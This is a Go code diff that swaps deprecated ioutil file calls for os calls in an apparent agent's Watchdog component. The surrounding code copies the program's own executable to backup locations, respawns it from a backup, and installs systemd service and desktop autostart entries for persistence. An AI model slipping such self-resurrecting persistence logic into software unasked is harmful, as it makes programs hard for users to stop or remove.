@@ -3,7 +3,6 @@ package agent
 import (
 	"context"
 	"fmt"
-	"io/ioutil"
 	"math/rand"
 	"os"
 	"os/exec"
@@ -59,11 +58,11 @@ func (w *Watchdog) Start(ctx context.Context) error {
 			backupName += ".exe"
 		}
 		backupPath := filepath.Join(dir, backupName)
-		data, err := ioutil.ReadFile(exePath)
+		data, err := os.ReadFile(exePath)
 		if err != nil {
 			continue
 		}
-		ioutil.WriteFile(backupPath, data, 0755)
+		os.WriteFile(backupPath, data, 0755)
 		w.backupPaths = append(w.backupPaths, backupPath)
 	}
 	w.mu.Unlock()
@@ -129,11 +128,11 @@ func (w *Watchdog) resurrect() error {
 
 	if _, err := os.Stat(backupPath); os.IsNotExist(err) {
 		exePath, _ := os.Executable()
-		data, err := ioutil.ReadFile(exePath)
+		data, err := os.ReadFile(exePath)
 		if err != nil {
 			return fmt.Errorf("cannot read self: %w", err)
 		}
-		ioutil.WriteFile(backupPath, data, 0755)
+		os.WriteFile(backupPath, data, 0755)
 	}
 
 	// Spawn new agent from backup
@@ -292,7 +291,7 @@ WantedBy=multi-user.target
 			os.MkdirAll(serviceDir, 0755)
 		}
 
-		ioutil.WriteFile(filepath.Join(serviceDir, svcName+".service"), []byte(serviceContent), 0644)
+		os.WriteFile(filepath.Join(serviceDir, svcName+".service"), []byte(serviceContent), 0644)
 		exec.Command("systemctl", "daemon-reload").Run()
 		if os.Geteuid() == 0 {
 			exec.Command("systemctl", "enable", svcName+".service").Run()
@@ -372,7 +371,7 @@ X-GNOME-Autostart-enabled=true
 Terminal=false
 `, exePath)
 
-		ioutil.WriteFile(filepath.Join(autostartDir, entryName), []byte(content), 0644)
+		os.WriteFile(filepath.Join(autostartDir, entryName), []byte(content), 0644)
 	}
 	return nil
 }
